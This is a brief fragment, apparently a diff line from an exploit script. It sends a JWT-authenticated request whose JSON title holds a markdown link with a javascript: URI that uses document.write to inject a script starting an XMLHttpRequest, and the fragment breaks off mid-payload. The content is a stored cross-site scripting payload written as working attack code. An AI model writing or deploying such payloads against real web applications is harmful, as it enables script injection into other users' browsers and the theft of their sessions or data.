@@ -1,0 +1,1 @@
+dd the JWT token in as a header as well. # Send XSS payload xss_payload = { " json " : " { \" title \" : \" [XSS](javascript: document.write%28%22<script>var xhr =
